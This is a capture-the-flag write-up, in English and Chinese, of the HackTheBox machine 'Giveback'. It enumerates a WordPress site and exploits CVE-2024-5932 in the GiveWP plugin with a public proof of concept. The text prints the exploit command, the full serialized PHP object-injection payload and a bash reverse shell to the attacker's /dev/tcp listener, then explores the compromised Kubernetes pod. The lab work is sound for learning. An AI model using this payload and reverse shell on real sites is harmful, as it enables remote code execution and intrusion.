## Giveback [0xdf]
```
[★]$ sudo nmap -p- -vvv --min-rate 10000 10.129.242.171
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-24 03:16 CDT
Initiating Ping Scan at 03:16
Scanning 10.129.242.171 [4 ports]
Completed Ping Scan at 03:16, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:16
Completed Parallel DNS resolution of 1 host. at 03:16, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 03:16
Scanning 10.129.242.171 [65535 ports]
Discovered open port 22/tcp on 10.129.242.171
Discovered open port 80/tcp on 10.129.242.171
Discovered open port 30686/tcp on 10.129.242.171
Completed SYN Stealth Scan at 03:16, 6.35s elapsed (65535 total ports)
Nmap scan report for 10.129.242.171
Host is up, received reset ttl 63 (0.011s latency).
Scanned at 2026-03-24 03:16:20 CDT for 7s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE      REASON
22/tcp    open     ssh          syn-ack ttl 63
80/tcp    open     http         syn-ack ttl 62
6443/tcp  filtered sun-sr-https no-response
10250/tcp filtered unknown      no-response
30686/tcp open     unknown      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds
           Raw packets sent: 66231 (2.914MB) | Rcvd: 65540 (2.622MB)

[★]$ nmap -p 22,80,30686 -sCV 10.129.242.171
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-24 03:17 CDT

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp    open  http    nginx 1.28.0
|_http-generator: WordPress 6.8.1
|_http-server-header: nginx/1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
30686/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Tue, 24 Mar 2026 08:17:46 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|     "serviceProxyHealthy": true
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Tue, 24 Mar 2026 08:17:21 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|_    "serviceProxyHealthy": true
```
#### 根据 OpenSSH 版本，该主机很可能运行的是 Ubuntu 22.04 jammy LTS 系统。nginx 版本与当前 SID（不稳定开发分支）以及将于 2027 年推出的 Debian 14 Forky 版本非常接近。
#### 要到达 80 端口的网络服务器还需要再经过一个跳转：
```
[★]$ sudo lft 10.129.242.171:22
traceroute to 10.129.242.171 (10.129.242.171), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.746 ms  8.604 ms
 2  10.129.242.171 (10.129.242.171)  9.228 ms  9.106 ms
[★]$ sudo lft 10.129.242.171:80
traceroute to 10.129.242.171 (10.129.242.171), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.707 ms  8.705 ms
 2  10.129.242.171 (10.129.242.171)  9.188 ms  9.258 ms
 3  10.129.242.171 (10.129.242.171)  9.142 ms  9.203 ms
[★]$ sudo lft 10.129.242.171:30686
traceroute to 10.129.242.171 (10.129.242.171), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.603 ms  8.532 ms
 2  10.129.242.171 (10.129.242.171)  9.109 ms  9.177 ms
```
#### 额外跳转到 80 端口表明网络流量是通过容器网络进行路由的，而 SSH 和 30686 则由主机直接处理。63 的 TTL 值与 Linux 系统一跳之遥的预期 TTL 值相符。
### Website - TCP 80
#### [1]在'DONATION FAILED' 
#### 在搜索栏中输入常见的词汇如“a”和“the”后，会进入另一个页面，该页面的地址为 /sample-page/ ：
```
Team, as u know, we’re going to start this NFP soon.
But we need to make it scalable and we need to use ‘new technologies’ – while saying goodbye to licensing that we can no longer afford.

Once we have proper funding we’ll move out into EKS.

Stay clean, stay focused-

-babywyrm
```
#### 另一个，‘Donation Station'
```
Shout it from the rooftops.
http://giveback.htb/donations/the-things-we-need/
```
```
[★]$ echo '10.129.242.171 giveback.htb' | sudo tee -a /etc/hosts
10.129.242.171 giveback.htb
```
#### 点击http://giveback.htb/donations/the-things-we-need/ 就会出现交易的页面
#### [2]在‘DONOR DASHBOARD
#### 此外还有一个“捐赠者仪表盘”链接，点击后会进入一个需要登录的页面
### Tech Stack
#### HTTP 响应头显示的是 nginx，但同时也提到了“wp”，这通常意味着是 WordPress：
```
[★]$ curl -I http://10.129.242.171:80
HTTP/1.1 200 OK
Server: nginx/1.28.0
Date: Wed, 25 Mar 2026 06:55:52 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Link: <http://10.129.242.171/wp-json/>; rel="https://api.w.org/"
Vary: Accept-Encoding
```
#### 该源代码中有大量的“wp”字符串，包括 wp-includes 路径（这是典型的 WordPress）
#### 404的页面：
![图片](images/2026032501.png)
#### 工具Wappalyzer显示WordPress 6.8.1
![图片](images/2026032502.png)
### WPScan
#### 需要注册https://wpscan.com/register/拿个token
```
[★]$ sudo wpscan --url http://giveback.htb -e ap,u --api-token cDAs***************************************
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
```
<details>
<summary>展开</summary>

```
[+] URL: http://giveback.htb/ [10.129.242.171]
[+] Started: Wed Mar 25 02:40:03 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: bizberg
 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://giveback.htb/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2026-03-11T18:43:00.000Z
 | [!] The version is out of date, the latest version is 4.14.3
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | [!] 22 vulnerabilities identified:
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.14.2 - Missing Authorization to Authenticated (Subscriber+) Limited File Deletion
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/528b861e-64bf-4c59-ac58-9240db99ef96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5941
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824ec2ba-b701-46e9-b237-53cd7d0e46da
 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
 |
 | [!] Title: GiveWP < 3.16.0 - Unauthenticated Full Path Disclosure
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/6ff11e50-188e-4191-be12-ab4bde9b6d27
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6551
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/2a13ce09-b312-4186-b0e2-63065c47f15d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Authenticated (GiveWP Manager+) SQL Injection via order Parameter
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/aed98bed-b6ed-4282-a20e-995515fd43a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9130
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4a3cae01-620d-405e-baf6-2d66a5b429b3
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/c1807282-5f15-4b21-81b6-dcb8b03618bd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8353
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c4c530fa-eaf4-4721-bfb6-9fc06d7f343c
 |
 | [!] Title: GiveWP < 3.16.0 - Cross-Site Request Forgery
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/582c6a46-486e-41ca-9c45-96dfe8b8ddbb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-47315
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ce9bac7-60bb-4880-9e37-4d71f02ee941
 |
 | [!] Title: GiveWP < 3.16.4 - Unauthenticated PHP Object Injection to Remote Code Execution
 |     Fixed in: 3.16.4
 |     References:
 |      - https://wpscan.com/vulnerability/793bdc97-69eb-43c3-aab0-c86a76285f36
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9634
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b8eb3aa9-fe60-48b6-aa24-7873dd68b47e
 |
 | [!] Title: Give < 3.19.0 - Reflected XSS
 |     Fixed in: 3.19.0
 |     References:
 |      - https://wpscan.com/vulnerability/5f196294-5ba9-45b6-a27c-ab1702cc001f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-11921
 |
 | [!] Title: GiveWP < 3.19.3 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.3
 |     References:
 |      - https://wpscan.com/vulnerability/571542c5-9f62-4e38-baee-6bbe02eec4af
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12877
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b2143edf-5423-4e79-8638-a5b98490d292
 |
 | [!] Title: GiveWP < 3.19.4 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.4
 |     References:
 |      - https://wpscan.com/vulnerability/82afc2f7-948b-495e-8ec2-4cd7bbfe1c61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-22777
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/06a7ff0b-ec6b-490c-9bb0-fbb5c1c337c4
 |
 | [!] Title: GiveWP < 3.20.0 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.20.0
 |     References:
 |      - https://wpscan.com/vulnerability/e27044bd-daab-47e6-b399-de94c45885c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0912
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8a8ae1b0-e9a0-4179-970b-dbcb0642547c
 |
 | [!] Title: Give < 3.22.1 - Missing Authorization to Unauthenticated Arbitrary Earning Reports Disclosure via give_reports_earnings Function
 |     Fixed in: 3.22.1
 |     References:
 |      - https://wpscan.com/vulnerability/ebe88626-2127-4021-aa8e-f2f47e12ad4f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2025
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/40595943-121d-4492-a0ed-f2de1bd99fda
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.22.2 - Authenticated (Subscriber+) Sensitive Information Exposure
 |     Fixed in: 3.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/b331a81b-b7cc-4e0a-a088-26468a835cc5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2331
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b4d9acfb-bb9d-4b00-b439-c7ccea751f8d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.3.1 - Missing Authorization To Authenticated (Contributor+) Campaign Data View And Modification
 |     Fixed in: 4.3.1
 |     References:
 |      - https://wpscan.com/vulnerability/f819ea85-bf28-4e8c-b72b-59741e7e9cee
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4571
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f03b4ef-e877-430e-a440-3af0feca818c
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.0 - Authenticated (GiveWP worker+) Stored Cross-Site Scripting
 |     Fixed in: 4.6.0
 |     References:
 |      - https://wpscan.com/vulnerability/fda8eaea-ca20-417a-896b-49c1fa0a1c07
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7205
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/39e501d8-88a0-4625-aeb0-aa33fc89a8d4
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.1 - Unauthenticated Donor Data Exposure
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/4739fdb8-9444-44b9-8e98-7a299e6fe186
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8620
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6dc7c5a6-513e-4aa8-9538-0ac6fb37c867
 |
 | [!] Title: GiveWP < 4.6.1 - Missing Authorization to Donation Update
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/bdfb968d-df2b-43ed-9a9c-f9b15d8457f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7221
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8766608e-df72-4b9d-a301-a50c64fadc9a
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.10.1 - Missing Authorization to Unauthenticated Forms-Campaign Association
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/5dccab73-e06f-4c01-837b-eddf42ea789d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11228
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ddf9a043-5eb6-46fd-88c2-0f5a04f73fc9
 |
 | [!] Title: GiveWP < 4.10.1 - Unauthenticated Forms and Campaigns Disclosure
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/e7a291a5-3846-42e7-b4f2-7b2383326d4c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11227
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/54db1807-69ff-445c-9e02-9abce9fd3940
 |
 | [!] Title: GiveWP < 4.13.1 - Unauthenticated Stored XSS via 'name'
 |     Fixed in: 4.13.1
 |     References:
 |      - https://wpscan.com/vulnerability/c03133b5-80f0-4d70-ad22-5dbd7e290031
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13206
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95823720-e1dc-46c1-887b-ffd877b2fbe5
 |
 | [!] Title: GiveWP < 4.13.2 - Cross-Site Request Forgery
 |     Fixed in: 4.13.2
 |     References:
 |      - https://wpscan.com/vulnerability/c7ee6f8c-5b2e-4074-9334-25ceaecc664d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-67467
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e6a7ec29-6dc6-4c73-8cc4-4aa4da79941e
 |
 | [!] Title: GiveWP < 4.13.2 - Unauthenticated Arbitrary Shortcode Execution
 |     Fixed in: 4.13.2
 |     References:
 |      - https://wpscan.com/vulnerability/3d8f4752-888f-45e3-8232-ca65078bdc98
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66533
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b9860e0e-e330-42fc-8a74-336ceb787f39
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <==> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] user
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://giveback.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://giveback.htb/wp-json/oembed/1.0/embed?url=http://giveback.htb/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://giveback.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 21

[+] Finished: Wed Mar 25 02:40:18 2026
[+] Requests Done: 64
[+] Cached Requests: 9
[+] Data Sent: 16.814 KB
[+] Data Received: 523.745 KB
[+] Memory used: 245.93 MB
[+] Elapsed time: 00:00:15
```
</details>

#### 这里有很多内容，包括 WP 版本中的 2 个漏洞以及 GiveWP 中的 22 个漏洞！浏览这些漏洞，最有趣的是：
```
[!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
```
### Web API - TCP 30686
#### 此 URL 返回有关“wp-nginx-service”的 JSON 数据：
![图片](images/2026032503.png)
```
[★]$ curl -I http://10.129.242.171:30686
HTTP/1.1 200 OK
Content-Type: application/json
X-Content-Type-Options: nosniff
X-Load-Balancing-Endpoint-Weight: 1
Date: Wed, 25 Mar 2026 08:06:46 GMT
Content-Length: 127
```
```
X-Load-Balancing-Endpoint-Weight是Google Cloud External Network Load Balancing使用的自定义 HTTP 响应标头，但 Cilium（一个 K8s 网络插件）也使用它。

综上所述，这似乎是一个 Kubernetes 服务代理，它基于以下原理暴露了一个名为“wp-nginx-service”的服务：

JSON 响应本身包含 Kubernetes 特有的字段：
“namespace”: “default”  - Kubernetes 将资源组织到命名空间中
带有名称和命名空间的“service”——这是 Kubernetes 服务识别的方式。
“localEndpoints”/“serviceProxyHealthy”——这些是Cilium健康代理术语。
端口 30686 属于 Kubernetes NodePort 范围 (30000-32767)，这是 K8s 用于向外部暴露服务的默认范围。
标题 X-Load-Balanced-Endpoint-Weight 是 Cilium 的特征。
服务名称 wp-nginx-service 遵循 Kubernetes 命名约定。
```
### Shell in WordPress K8 Pod
```
CVE-2024-5932 背景
NIST对 CVE-2024-5932 的描述如下：

WordPress 的 GiveWP – 捐赠插件和筹款平台插件存在 PHP 对象注入漏洞，该漏洞存在于 3.14.1 及更早版本中，攻击者可通过反序列化“give_title”参数中不受信任的输入来利用此漏洞。这使得未经身份验证的攻击者能够注入 PHP 对象。此外，该漏洞还利用了 POP 链，攻击者可以远程执行代码并删除任意文件。

EQSTLab 提供了一个不错的漏洞概念验证 (POC) 。它的结构有点过于复杂，但基本原理是从页面获取一些数据，然后使用序列化的 PHP 对象发出请求。
```
#### 将克隆该仓库，并将元数据添加到脚本中，以便它uv可以运行和管理虚拟环境：
https://github.com/EQSTLab/CVE-2024-5932
```
[★]$ git clone https://github.com/EQSTLab/CVE-2024-5932.git
[★]$ cd CVE-2024-5932
[~/CVE-2024-5932][★]$ ls
CVE-2024-5932.py  CVE-2024-5932-rce.py  PoC.php  README.md  requirements.txt
[~/CVE-2024-5932][★]$ pip install -r requirements.txt
[~/CVE-2024-5932][★]$ python3 CVE-2024-5932-rce.py
                                                                                
 Usage: CVE-2024-5932-rce.py [OPTIONS]                                          
                                                                                
 Try 'CVE-2024-5932-rce.py --help' for help                                     
╭─ Error ──────────────────────────────────────────────────────────────────────╮
│ Missing option '-u' / '--url'.                                               │
╰──────────────────────────────────────────────────────────────────────────────╯              
[★]$ sudo nc -lvnp 443
listening on [any] 443 ...

```
```
[★]$ python3 CVE-2024-5932-rce.py --url http://giveback.htb/donations/the-things-we-need/ --cmd 'bash -c "bash -i >& /dev/tcp/10.10.15.139/443 0>&1"'
<SNIP>
[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': '8cd3aa4cd6', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Jason', 'give_last': 'Warren', 'give_email': 'uhowe@example.net', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:51:"bash -c "bash -i >& /dev/tcp/10.10.15.139/443 0>&1"";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```
#### 连接上反弹
```
[★]$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.139] from (UNKNOWN) [10.129.242.171] 38135
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$ whoami 
whoami
whoami: cannot find name for user ID 1001
<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$ ^Z
[1]+  Stopped                 sudo nc -lvnp 443
┌─[us-dedivip-4]─[10.10.15.139]─[syareya55@htb-nd098h0v5r]─[~/CVE-2024-5932]
└──╼ [★]$ stty raw -echo; fg
sudo nc -lvnp 443
                 reset
bash: reset: command not found
<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$
```
#### Shell as root on legacy-internet-cms Pod
```
<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$ whoami
whoami: cannot find name for user ID 1001
```
#### “I have no name!”是因为该用户在文件中没有映射关系passwd：
```
<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$ cd /
I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/$ id
uid=1001 gid=0(root) groups=0(root),1001

I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
#### I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/$
#### 主机名符合 K8s 的默认命名模式<deployment>-<replicaset-hash>-<pod-hash>，因此部署名称为“beta-vino-wp-wordpress”，副本集哈希值为“59ffb97c44”，pod 唯一哈希值为“pjh4n”
#### 初始目录与/opt/bitnami/wordpress/Bitnami Helm chart WordPress 布局相匹配，这是在 Kubernetes 上部署 WordPress 的标准方法
https://www.fobwp.com/kubernetes-wordpress-guide/
#### 文件系统根目录中的文件也与 Kubernetes 匹配：
```
I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/$ ls
bin	 dev   lib    mnt	   post-init.sh  run	  srv  usr
bitnami  etc   lib64  opt	   proc		 sbin	  sys  var
boot	 home  media  post-init.d  root		 secrets  tmp
```
#### /secrets很可能是已挂载的 K8s 密钥目录。post-init.d而post-init.sh则是 Bitnami K8s 容器的初始化脚本。
#### 这一切都与上面在 30686 端口观察到的情况相符。而且环境非常精简。没有ping`<path> `、 curl`<path>`、reset`<path>` 或 `<path> stty`。`<path>` 中没有任何目录/home，并且只有 root 用户设置了 shell。在 Kubernetes 容器中，如果设置了 `<path>`，则经常securityContext.runAsUser会出现进程以 `<path>` 中不存在的 UID 运行的情况/etc/passwd
#### 文件/etc/hosts还显示它由 Kubernetes 管理：
```
I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/$ cat /etc/hosts
# Kubernetes-managed hosts file.
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
fe00::0	ip6-mcastprefix
fe00::1	ip6-allnodes
fe00::2	ip6-allrouters
